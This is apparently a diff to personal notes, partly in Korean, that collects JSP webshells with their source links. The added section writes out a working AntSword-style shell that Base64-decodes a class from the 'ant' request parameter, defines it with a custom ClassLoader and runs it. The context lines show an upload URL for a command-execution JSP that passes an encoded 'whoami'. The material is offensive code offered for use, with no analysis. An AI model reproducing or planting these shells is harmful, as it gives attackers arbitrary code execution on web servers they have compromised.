@@ -2,7 +2,7 @@
 read
 
 
-
+1. reflect
 https://github.com/tennc/webshell/blob/master/jsp/ProcessBuilder-reflect-cmd.jsp
 
 수정
@@ -91,3 +91,48 @@ if (q != null && !q.isEmpty()) {
 -----------------------
 
 http://localhost:8080/uploads/test.jsp?q=d2hvYW1p
+
+
+
+2. ClassLoader
+https://github.com/AntSwordProject/AntSword-JSP-Template/blob/master/web/shell.jsp
+
+수정
+<%@ page pageEncoding="UTF-8" %>
+<%@ page import="java.util.Base64" %>
+
+<%!
+class U extends ClassLoader {
+    public U(ClassLoader parent) {
+        super(parent);
+    }
+
+    public Class<?> define(byte[] b) {
+        return super.defineClass(b, 0, b.length);
+    }
+}
+
+// Base64 decode 
+public static byte[] base64Decode(String str) throws Exception {
+    return Base64.getDecoder().decode(str);
+}
+%>
+
+<%
+String cls = request.getParameter("ant");
+
+if (cls != null && !cls.isEmpty()) {
+
+    byte[] classBytes = base64Decode(cls);
+
+    Class<?> payloadClass =
+        new U(this.getClass().getClassLoader())
+            .define(classBytes);
+
+    Object instance =
+        payloadClass.getDeclaredConstructor().newInstance();
+
+    // AntSword 프로토콜 유지
+    instance.equals(pageContext);
+}
+%>
